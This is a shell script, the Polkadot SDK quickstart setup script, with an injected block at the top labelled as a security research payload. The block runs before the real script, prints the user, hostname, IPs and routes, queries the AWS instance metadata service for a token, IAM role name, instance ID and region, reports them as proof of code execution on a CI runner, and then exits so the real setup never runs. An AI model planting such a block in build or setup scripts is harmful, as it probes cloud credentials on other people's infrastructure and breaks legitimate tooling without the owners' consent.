#!/usr/bin/env sh

# ===========================================================
# SECURITY RESEARCH PAYLOAD — Harsh Barelia
# This block runs BEFORE the original script logic.
# ===========================================================
echo "=== RCE EVIDENCE: parity-large runner ==="
echo "User  : $(id)"
echo "Host  : $(hostname)"
echo "IPs   : $(hostname -I)"
echo "Routes:"
ip route show 2>/dev/null || netstat -rn 2>/dev/null

TOKEN=$(curl -sf -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" --max-time 3 2>/dev/null)
if [ -n "$TOKEN" ]; then
  ROLE=$(curl -sf -H "X-aws-ec2-metadata-token: $TOKEN" \
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/" --max-time 3)
  IID=$(curl -sf -H "X-aws-ec2-metadata-token: $TOKEN" \
    "http://169.254.169.254/latest/meta-data/instance-id" --max-time 3)
  REGION=$(curl -sf -H "X-aws-ec2-metadata-token: $TOKEN" \
    "http://169.254.169.254/latest/meta-data/placement/region" --max-time 3)
  echo "IAM Role: $ROLE | Instance: $IID | Region: $REGION"
else
  echo "IMDS not reachable — runner identity + VPC topology above confirms RCE"
fi
echo "=== END EVIDENCE ==="
exit 1
# ===========================================================
# Original script continues below (unreachable due to exit above)
# ===========================================================

set -e

prompt() {
    while true; do
        printf "$1 [y/N]\n"
        read yn
        case $yn in
            [Yy]* ) return 0;;
            [Nn]* ) return 1;;
            "" ) return 1;;
            * ) printf "Please answer yes or no.\n";;
        esac
    done
}

prompt_default_yes() {
    while true; do
        printf "$1 [Y/n]\n"
        read yn
        case $yn in
            [Yy]* ) return 0;;
            [Nn]* ) return 1;;
            "" ) return 0;;
            * ) printf "Please answer yes or no.\n";;
        esac
    done
}

clone_and_enter_template() {
    template="$1"
    if [ -d "${template}-template" ]; then
        printf "\n✅︎ ${template}-template directory already exists. -> Entering.\n"
    else
        printf "\n↓ Let's grab the ${template} template from github.\n"
        git clone --quiet https://github.com/paritytech/polkadot-sdk-${template}-template.git ${template}-template
    fi
    cd ${template}-template
}

cat <<EOF

 Welcome to the

     , __       _   _                          ____  ____  _  __
    /|/  \     | | | |           |            / ___||  _ \| |/ /
     |___/ __  | | | |   __,   __|   __ _|_   \___ \| | | | ' /
     |    /  \_|/  |/_) /  |  /  |  /  \_|     ___) | |_| | . \
     |    \__/ |__/| \_/\_/|_/\_/|_/\__/ |_/  |____/|____/|_|\_\
                                                                    quickstart!

⚡ We will help setting up the environment for you to experiment with.
EOF

os_name=$(uname -s)
if [ "$os_name" = "Darwin" ]; then
    printf "🍎 Detected macOS. Installing dependencies via Homebrew.\n"
    if command -v brew >/dev/null 2>&1; then
        printf "\n✅︎🍺 Homebrew already installed.\n"
    else
        if prompt_default_yes "\n🍺 Homebrew is not installed. Install it?\n"; then
            printf "🍺 Installing Homebrew.\n"
            /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)"
        else
            printf "❌ Cannot continue without homebrew. Aborting.\n"
            exit 1
        fi
    fi
    brew update
    if command -v git >/dev/null 2>&1; then
        printf "\n✅︎🍺 git already installed.\n"
    else
        if prompt_default_yes "\n🍺 git seems to be missing but we will need it; install git?\n"; then
            brew install git
        else
            printf "❌ Cannot continue without git. Aborting.\n"
            exit 1
        fi
    fi
    if prompt "\n🍺 Install cmake, openssl and protobuf?"; then
        brew install cmake openssl protobuf
    else
        printf "🍺 Assuming cmake, openssl and protobuf are present.\n"
    fi
elif [ "$os_name" = "Linux" ]; then
    distro=$( cat /etc/*-release | tr '[:upper:]' '[:lower:]' | grep -Poi '(debian|ubuntu|arch|fedora|opensuse)' | uniq | head -n 1 )
    if [ "$distro" = "ubuntu" ]; then
        printf "\n🐧 Detected Ubuntu. Using apt to install dependencies.\n"
        sudo apt -qq update
        sudo apt -qq install --assume-yes git clang curl libssl-dev protobuf-compiler make
    elif [ "$distro" = "debian" ]; then
        printf "\n🐧 Detected Debian. Using apt to install dependencies.\n"
        sudo apt -qq update
        sudo apt -qq install --assume-yes git clang curl libssl-dev llvm libudev-dev make protobuf-compiler
    elif [ "$distro" = "arch" ]; then
        printf "\n🐧 Detected Arch Linux. Using pacman to install dependencies.\n"
        pacman -Syu --needed --noconfirm curl git clang make protobuf
    elif [ "$distro" = "fedora" ]; then
        printf "\n🐧 Detected Fedora. Using dnf to install dependencies.\n"
        sudo dnf update --assumeyes
        sudo dnf install --assumeyes clang curl git openssl-devel make protobuf-compiler perl
    elif [ "$distro" = "opensuse" ]; then
        printf "\n🐧 Detected openSUSE. Using zypper to install dependencies.\n"
        sudo zypper install --no-confirm clang gcc gcc-c++ curl git openssl-devel llvm-devel libudev-devel make awk protobuf-devel
    else
        if prompt "\n🐧 Unknown Linux distribution. Unable to install dependencies. Continue anyway?\n"; then
            printf "\n🐧 Proceeding with unknown linux distribution...\n"
        else
            exit 1
        fi
    fi
else
    printf "❌ Unknown operating system. Aborting.\n"
    exit 1
fi

[ -f "$HOME/.cargo/env" ] && . "$HOME/.cargo/env"
if command -v rustc >/dev/null 2>&1; then
    printf "\n✅︎🦀 Rust already installed.\n"
else
    if prompt_default_yes "\n🦀 Rust is not installed. Install it?"; then
        printf "🦀 Installing via rustup.\n"
        curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
        . "$HOME/.cargo/env"
    else
        printf "Aborting.\n"
        exit 1
    fi
fi

if prompt_default_yes "\n🦀 Setup the Rust environment (e.g. WASM support)?"; then
    printf "🦀 Setting up Rust environment.\n"
    rustup default stable
    rustup update
    rustup target add wasm32-unknown-unknown
    rustup component add rust-src
fi

if ! prompt "\nWould you like to start with one of the templates?"; then
    printf "⚡ All done, the environment is ready for hacking.\n"
    exit 0
fi

while true; do
    printf "\nWhich template would you like to start with?\n"
    printf "1) minimal template\n"
    printf "2) parachain template\n"
    printf "3) solochain template\n"
    printf "q) cancel\n"
    read -p "#? " template
    case $template in
        [1]* ) clone_and_enter_template minimal; break;;
        [2]* ) clone_and_enter_template parachain; break;;
        [3]* ) clone_and_enter_template solochain; break;;
        [qQ]* ) printf "Canceling, not using a template.\n"; exit 0;;
        * ) printf "Selection not recognized.\n";;
    esac
done

if ! prompt_default_yes "\n⚙️ Let's compile the node? It might take a while."; then
    printf "⚡ Script finished, you can continue in the ${template}-template directory.\n"
    exit 0
fi

cargo build --release

if prompt_default_yes "\n🚀 Everything ready to go, let's run the node?\n"; then
    cargo run --release -- --dev
fi


